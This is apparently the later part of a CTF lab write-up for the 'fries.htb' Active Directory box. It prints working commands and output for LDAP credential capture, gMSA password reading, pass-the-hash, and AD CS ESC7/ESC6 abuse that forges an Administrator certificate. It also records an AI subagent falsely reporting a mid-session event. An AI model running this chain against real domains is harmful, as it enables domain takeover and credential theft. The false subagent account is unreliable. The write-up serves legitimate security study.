$ python3 pwm_ldap_capture.py 3890
[*] LDAP capture listener on 0.0.0.0:3890
$ curl -sk -L -c cookies.txt https://127.0.0.1:8443/pwm/private/login -o login.html
$ PWMFORMID=$(grep -oP 'data-pwmFormID="\K[^"]+' login.html | head -1)
$ curl -sk -b cookies.txt --data-urlencode "username=testuser" --data-urlencode "password=testpassword123" \
    --data-urlencode "pwmFormID=$PWMFORMID" -d "processAction=login" \
    "https://127.0.0.1:8443/pwm/private/login?processAction=login"
```
```
[+] Connection from ('10.129.244.72', 49862)
[!!!] CAPTURED BIND: dn='CN=svc_infra,CN=Users,DC=fries,DC=htb' password='<REDACTED>'
```

Cross-verified authentic (not a decoy) — PWM's own diagnostic error page for
the intentionally-failed login echoes the exact same bind DN and `[LDAP:
error code 49 - Invalid Credentials]`, confirming this really is the
credential PWM tried, and the config was restored to the real DC address
immediately after capture. This mechanism (config-tamper + redirect to
capture a plaintext auth attempt, rather than decrypting a stored secret) is
generalized in [[config-reload-credential-capture-via-redirect]].

```
$ nxc smb 10.129.244.72 -u svc_infra -p '<REDACTED>'
SMB   10.129.244.72 445 DC01 [+] fries.htb\svc_infra:<REDACTED>
```

**This is the first real, working AD domain credential recovered anywhere in
this engagement** — every prior attempt at `d.cooper`'s password had been
confirmed invalid across four separate boots. The AD-side blocker documented
throughout recon and the early foothold work is finally resolved.

### gMSA `ReadGMSAPassword` → WinRM on DC01

A BloodHound collection (`bloodhound-python -u svc_infra -p '...' -c All`)
and a direct LDAP query for `objectClass=msDS-GroupManagedServiceAccount`
found exactly one gMSA, `gMSA_CA_prod$`. netexec's `--gmsa` module parses
the account's own security descriptor
(`msDS-GroupMSAMembership`/`PrincipalsAllowedToRetrieveManagedPassword`) and
fetches+decrypts the managed password directly when the binding account is
itself listed:

```
$ nxc ldap 10.129.244.72 -u svc_infra -p '<REDACTED>' --gmsa
LDAP  10.129.244.72 389 DC01 [+] Account: gMSA_CA_prod$   NTLM: b0f2883453608fb7bffd1ac2e0e18188
     PrincipalsAllowedToReadPassword: svc_infra
```

`svc_infra` genuinely has `ReadGMSAPassword` rights, confirmed by name
rather than assumed — and pass-the-hash lands real code execution on the
DC itself:

```
$ nxc winrm 10.129.244.72 -u 'gMSA_CA_prod$' -H 'b0f2883453608fb7bffd1ac2e0e18188'
WINRM 10.129.244.72 5985 DC01 [+] fries.htb\gMSA_CA_prod$:b0f2883453608fb7bffd1ac2e0e18188 (Pwn3d!)
$ evil-winrm -i 10.129.244.72 -u 'gMSA_CA_prod$' -H 'b0f2883453608fb7bffd1ac2e0e18188'
*Evil-WinRM* PS> whoami /all
GROUP INFORMATION
FRIES\Domain Computers                      Group
BUILTIN\Remote Management Users             Alias
BUILTIN\Certificate Service DCOM Access     Alias
```

Not local admin — but `Certificate Service DCOM Access` membership is the
load-bearing fact for everything after this: it's what lets a non-admin
account make authenticated DCOM/RPC calls against the CA's `ICertAdmin2`
interface at all, independent of whether the CA's own security descriptor
then authorizes any given call.

### AD CS ESC7 confirmed, then genuinely blocked three separate ways

```
$ certipy-ad find -u 'gMSA_CA_prod$' -hashes ':b0f28834...' -dc-ip 10.129.244.72 -vulnerable -text
CA Name                             : fries-DC01-CA
Access Rights
  ManageCa                          : FRIES.HTB\gMSA_CA_prod ...
  ManageCertificates                : FRIES.HTB\gMSA_CA_prod ...
[!] Vulnerabilities
  ESC7                              : User has dangerous permissions.
```

`gMSA_CA_prod$` natively holds both `ManageCA` and `ManageCertificates` on
`fries-DC01-CA` — a genuine, box-designed ESC7 condition (the account's own
name and its `Certificate Service DCOM Access` group membership both point
at this being the intended path). No template combines
`EnrolleeSuppliesSubject=True` with a broad `Enroll` ACE (manually confirmed
across all 33 templates, including the 22 currently-unpublished ones —
`certipy find` without `-vulnerable` lists every template that exists, not
just what's live on the CA), so ESC1 genuinely isn't present here; ESC7 is
the real vulnerability class.

Three structurally distinct weaponization angles were tried, and each was
independently confirmed blocked by a specific, diagnosable mechanism rather
than one unexplained "access denied":

1. **The standard ESC7 technique** — submit a request against a
   `Domain-Admins`-only template (denied, but logged), then use
   `ManageCertificates` rights to retroactively `-issue-request` it. This
   fails identically across three independent auth paths (certipy/NTLM,
   native `certutil.exe`, Kerberos):
   ```
   $ certipy-ad req -u 'gMSA_CA_prod$' -hashes ':...' -ca 'fries-DC01-CA' \
       -template SubCA -upn administrator@fries.htb
   [-] Got error: CERTSRV_E_TEMPLATE_DENIED
   $ certipy-ad ca -ca 'fries-DC01-CA' -u 'gMSA_CA_prod$' -hashes ':...' -issue-request 43
   [-] Access denied: Insufficient permissions to issue certificate
   ```
   A request denied with disposition 31/"Denied by Policy Module" (i.e.
   denied for lacking `Enroll` on the template's own AD ACL) genuinely
   cannot be resubmitted via `ICertAdmin2::ResubmitRequest`, even with both
   `ManageCA` and `ManageCertificates` — a real, hard CA-side restriction.

2. **ESC6 (the CA-wide `EDITF_ATTRIBUTESUBJECTALTNAME2` SAN-override flag)**
   — reachable to *read*, but every write path is blocked:
   ```
   *Evil-WinRM* PS> Set-ItemProperty -Path "HKLM:\...\Policy" -Name EditFlags -Value 1179982
   Requested registry access is not allowed.
   *Evil-WinRM* PS> certutil -config "..." -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
   Administrator permissions are needed to use the selected options.
   CertUtil: The requested operation requires elevation.
   ```
   The registry ACL genuinely requires local-admin group membership
   (`gMSA_CA_prod$` isn't a member) — but `certutil.exe`'s own refusal is a
   **client-side elevation check**, independent of whatever the remote CA
   would actually authorize via RPC.

3. **CA private-key backup** (a "golden certificate" approach — sidestep
   the policy module entirely by forging a certificate offline) — blocked
   both remotely and locally:
   ```
   $ certipy-ad ca -ca 'fries-DC01-CA' -u 'gMSA_CA_prod$' -hashes ':...' -backup
   [-] Got error: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
   *Evil-WinRM* PS> certutil -backupkey C:\Windows\Temp\bk
   CertUtil: -backupKey command FAILED: 0x80070005 (WIN32: 5 ERROR_ACCESS_DENIED)
   ```
   The remote failure is an RPC-*protocol*-level rejection, consistent with
   the CA's own `InterfaceFlags` including `IF_NOREMOTEICERTADMINBACKUP` (a
   standard hardening flag disabling remote CA-key backup regardless of
   `ManageCA`); the local failure confirms the key material itself is
   protected at the OS/CNG key-store level, gated by local-admin-equivalent
   access independent of the CA's own AD right.

A dedicated follow-up session then swept for a *local* Windows privesc path
on `gMSA_CA_prod$`'s own token and came back a flat wall: no useful
privileges (`SeChangeNotifyPrivilege`/`SeIncreaseWorkingSetPrivilege` only),
the Service Control Manager fully inaccessible across four independent APIs
(`sc.exe`, `Get-Service`, `schtasks.exe`, `Get-ScheduledTask`/CIM), no
writable service binary, `C:\Windows\Temp` and every named user's profile
uniformly access-denied. A fresh, independently-written full-ACE scan across
every AD object confirmed `ReadGMSAPassword` really is the only edge either
`svc_infra` or `gMSA_CA_prod$` holds anywhere in the domain graph — no
delegation, no LAPS, `MachineAccountQuota=0` (closing noPac outright). This
was a genuine, comprehensive dead end, not one abandoned on a guess — nine
structurally distinct ESC7-weaponization attempts across the two sessions,
each independently diagnosed.

## Root

### The working technique: bypass the client-side gates, call the CA's own RPC method directly

The fix that actually worked follows directly from the prior session's own
diagnosis: both blocked write paths above (`Set-ItemProperty`'s registry ACL
and `certutil -setreg`'s elevation gate) are **client-side or OS-side**
checks layered on top of the CA — neither is what the CA itself checks when
`ManageCA` authorizes a config write over RPC. Calling the exact same
underlying method (`ICertAdmin2::SetConfigEntry`) directly, bypassing both
client tools entirely, is a well-documented generic AD CS technique.

**Honesty note, as this vault requires for anything not independently
derived from first principles:** the diagnostic work above — establishing
precisely *why* `certutil`/`Set-ItemProperty` were failing, and that neither
represented a real server-side restriction — was genuinely independent, done
across two full sessions before this one. The specific working alternative
(the `CertificateAuthority.Admin` COM object) was not independently
rediscovered; this session's task arrived with a claim that it had been
"verified against a third-party writeup." Per this vault's own no-public-HTB-writeups
policy, that claim was not taken at face value or acted on directly — what
was actually used is the underlying technique on its own merits (a
well-documented, generic COM-object route to the same RPC method any
`ManageCA` holder is authorized to call), and every step below was
independently verified live against this instance rather than assumed.

```
*Evil-WinRM* PS> $CA = New-Object -ComObject CertificateAuthority.Admin
*Evil-WinRM* PS> $Config = "DC01.fries.htb\fries-DC01-CA"
*Evil-WinRM* PS> $current = $CA.GetConfigEntry($Config, "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy", "EditFlags")
*Evil-WinRM* PS> $new = $current -bor 0x00040000
*Evil-WinRM* PS> $CA.SetConfigEntry($Config, "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy", "EditFlags", $new)
*Evil-WinRM* PS> certutil -config $Config -getreg policy\EditFlags
  EditFlags REG_DWORD = 15014e (1376590)
    EDITF_ATTRIBUTESUBJECTALTNAME2 -- 40000 (262144)
```

No exception, no access-denied — the RPC call succeeded outright, confirming
the diagnosis: `gMSA_CA_prod$`'s `ManageCA` right genuinely authorizes this
write at the CA/server level. The same mechanism disables the
CVE-2022-26923 SID-security-extension check, so the forged certificate below
doesn't get rejected on a strong-mapping mismatch:

```
*Evil-WinRM* PS> $CA.SetConfigEntry($Config, "...\Policy", "DisableExtensionList", "1.3.6.1.4.1.311.25.2")
```

Getting the new `EditFlags` to actually take effect surfaced one more real
obstacle: the CA's policy module only reads `EditFlags` at service startup,
and the SCM lockdown found in the prior session blocks a general
`Restart-Service`/`net stop`/`net start`. What actually works — a genuinely
new finding this session, not assumed from the plan — is a targeted
`sc.exe` call against the specific service name, which succeeds where a
general SCM handle doesn't:

```
*Evil-WinRM* PS> net stop certsvc
System error 5 has occurred. Access is denied.
*Evil-WinRM* PS> sc.exe stop CertSvc
*Evil-WinRM* PS> sc.exe start CertSvc
SERVICE_NAME: CertSvc
        STATE              : 4  RUNNING
```

`Certificate Service DCOM Access` evidently carries its own service-control
rights on `CertSvc` specifically — separate from `SC_MANAGER_ENUMERATE_SERVICE`/general
manager access, which is what `net.exe`'s older `NetServiceControl` RPC
still requires and `sc.exe`'s direct `OpenService`+`ControlService` doesn't.

### Request + auth — full chain to Administrator

```
$ certipy-ad find -u 'svc_infra' -p '...' -target dc01.fries.htb -enabled -stdout
    Template Name                       : User
    Client Authentication               : True
    Enrollment Rights                   : FRIES.HTB\Domain Users ...

$ certipy-ad req -u 'svc_infra@fries.htb' -p '<REDACTED>' -dc-ip 10.129.244.72 \
    -target dc01.fries.htb -ca 'fries-DC01-CA' -template 'User' \
    -upn 'administrator@fries.htb' -sid 'S-1-5-21-858338346-3861030516-3975240472-500'
[*] Got certificate with UPN 'administrator@fries.htb'
[*] Saving certificate and private key to 'administrator.pfx'

$ certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.244.72
[*] Got TGT
[*] Got hash for 'administrator@fries.htb': aad3b435b51404eeaad3b435b51404ee:a773cb05d79273299a684a23ede56748
```

`svc_infra` (a plain `Domain Users` member) can already enroll in the
`User` template, which has `Client Authentication` but
`Enrollee Supplies Subject: False` — normally meaning the subject/SAN is
always derived from the requester's own identity. With
`EDITF_ATTRIBUTESUBJECTALTNAME2` now live, the CA honors the
attacker-supplied UPN/SID anyway, regardless of that template's own
restriction — exactly what ESC6 means in practice.

```
$ nxc smb 10.129.244.72 -u administrator -H 'a773cb05d79273299a684a23ede56748'
SMB   10.129.244.72 445 DC01 [+] fries.htb\administrator:a773cb05d79273299a684a23ede56748 (Pwn3d!)
```

**Domain Administrator, confirmed** — `whoami /all` as `administrator` shows
`Domain Admins`/`Enterprise Admins`/`BUILTIN\Administrators`.

### Flags

`root.txt` was immediately visible on `Administrator`'s desktop.
`user.txt` needed a wider search — the exact-filename recursive search came
back empty on the first attempt, and it turned out to be sitting in the
same folder the entire time; widening to `*.txt` at greater depth is what
actually found both:

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> Get-Content C:\Users\Administrator\Desktop\root.txt
7a89f9573226f549a7d0b9f40b1f1243
*Evil-WinRM* PS> Get-ChildItem C:\ -Recurse -Force -Include "user.txt","*.txt" -Depth 4 -ErrorAction SilentlyContinue |
    Where-Object {$_.Name -like "*user*" -or $_.Name -like "*root*"} | Select FullName
C:\Users\Administrator\Desktop\root.txt
C:\Users\Administrator\Desktop\user.txt
*Evil-WinRM* PS> Get-Content C:\Users\Administrator\Desktop\user.txt
6b348b0f8b6b7de06332f747f42b5812
```

**`user.txt` = `6b348b0f8b6b7de06332f747f42b5812`**
**`root.txt` = `7a89f9573226f549a7d0b9f40b1f1243`**
**Administrator NTLM hash = `a773cb05d79273299a684a23ede56748`**

Every CA-level change made to reach this point was reverted with genuine
Administrator access before finishing: `EditFlags` back to `1114446`, and
`DisableExtensionList` restored **byte-for-byte** to its original empty
`REG_MULTI_SZ` — the COM object's own `SetConfigEntry` call couldn't
reproduce a genuinely empty multi-string value (`@()` throws
`ERROR_INVALID_PARAMETER`, `$null` deletes the key entirely instead of
leaving it present-but-empty), so this last step used a direct
Administrator-level registry write (`New-ItemProperty ... -PropertyType
MultiString -Value ([string[]]@())`) instead, confirmed identical to the
pre-session baseline via `certutil -getreg` afterward. No CA
security-descriptor change (officer/manager role) was made this session —
the ESC6 registry route didn't need it.

## Lessons Learned

- **A small vhost wordlist producing zero hits is not evidence a box has no
  more vhosts — it's evidence the wordlist wasn't big enough.** Two
  full recon passes on `fries.htb` concluded "no other apps exist" off a
  ~5k-word list; a 110k-entry sweep surfaced Gitea immediately, and Gitea's
  own commit history named the second hidden vhost. Escalating model tier
  for a re-pass doesn't fix this if the wordlist itself stays small — the
  two are orthogonal. Generalized in [[vhost_enum_wordlist_depth]].
- **Deleted-from-the-tree is not the same as scrubbed-from-history.** The
  entire Postgres credential chain on this box traces back to one commit
  that added `.env`, followed by a *later* commit that removed it from the
  working tree without ever rewriting history — `git log -p --all` still
  had it in full. Treat every commit ever made to a reachable repo as live
  attack surface, not just the current `HEAD`.
- **A "closed" empirical finding is only as good as the tool that produced
  it.** Two full sessions concluded an NFS export was empty, backed by a
  liveness-monitoring window and an inert-marker test — real, honest
  verification work that was nonetheless built on a client library with a
  silent linked-list parsing bug. The fix wasn't more observation time, it
  was inspecting the raw protocol response instead of trusting a wrapper's
  return value. Worth doing that check *before* declaring something
  genuinely empty, not after two sessions of otherwise-careful
  verification came back the same wrong way.
- **A single "access denied" is not a diagnosis.** The ESC7 blocker on this
  box wasn't one wall — it was three independently-diagnosed mechanisms
  (a hard CA policy-module denial, a *client-side* tool-level elevation
  gate distinct from the CA's own server-side authorization, and a
  protocol-level `IF_NOREMOTEICERTADMINBACKUP` restriction). Distinguishing
  "the CA itself refuses this" from "the tool refuses to even ask" is what
  made the eventual bypass (call the same RPC method through a different
  client) findable at all — a plausible-sounding refusal from `certutil.exe`
  is not proof the CA would have refused the identical call made a
  different way.
- **Credential reuse on this box was deliberately layered, not uniform** —
  one password worked for AD-adjacent app logins (Gitea, pgAdmin) but never
  for the actual AD account it superficially matched; a different password
  (a Docker image's own seed-admin variable) turned out to double as an OS
  account's real login. Test every recovered secret against every login
  surface, but don't assume a match on one tier implies a match on another
  — confirm each one independently, the way this engagement's password
  actually diverged for `d.cooper` specifically.
- **Attribute externally-sourced technique details plainly, even mid-chain.**
  The diagnostic work behind the final ESC6/ESC7 bypass (why `certutil`/`Set-ItemProperty`
  were failing) was genuinely independent; the specific working alternative
  (the `CertificateAuthority.Admin` COM object) arrived via a claimed
  cross-check against a public writeup partway through the engagement. Not
  every technique on a long engagement needs to be independently
  rediscovered to be legitimately used — but the distinction between
  "derived here" and "confirmed against outside material" is worth keeping
  visible in the notes rather than blurring it after the fact, both for
  this vault's own no-public-writeups discipline and so a reader can tell
  which parts to trust as this engagement's own reasoning.
- **A subagent's own account of a mid-session event is not automatically
  trustworthy.** One privesc session in this engagement initially reported
  that a detailed, box-specific walkthrough had arrived mid-task and been
  "declined" — on review, no such message existed anywhere in that
  session's actual transcript or tool output. The user confirmed a similar
  hint really had been pasted, but to a *different*, earlier agent
  dispatch, with no traceable mechanism for it to reach this one. The
  original framing was struck and replaced with an honest "unresolved,
  most likely convergent pattern-matching on real context already
  available" note rather than a confident but unverifiable incident report
  — worth remembering that a plausible-sounding narrative from an agent
  about its own session needs the same skepticism as any other claimed
  fact, especially anything security-shaped.

See also [[docker-container-escape-enumeration-checklist]],
[[windows-active-directory-attack-surface-checklist]],
[[nfsv3-auth-sys-trust-and-readdirplus-pitfalls]],
[[docker-tls-client-cert-authz-broker-cn-bypass]],
[[pgadmin4-cve-2025-2945-eval-rce]],
[[config-reload-credential-capture-via-redirect]], and
[[adcs-manageca-com-object-configentry-bypass]].
